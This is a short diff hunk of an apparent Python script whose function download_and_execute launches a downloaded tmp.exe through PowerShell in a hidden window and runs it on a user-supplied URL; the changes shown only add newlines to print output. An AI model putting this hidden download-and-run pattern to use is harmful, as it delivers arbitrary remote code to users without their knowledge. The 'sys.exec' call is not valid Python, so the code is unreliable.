@@ -22,7 +22,9 @@ def download_and_execute(url):
         sys.exec("powershell.exe", ["Start-Process -WindowStyle hidden ./tmp.exe"])
 
     else:
-        print("OS not supported")
+        print("OS not supported\n")
         return
 
 download_and_execute(input_params['url'])
+print("\n")
+print("\n")
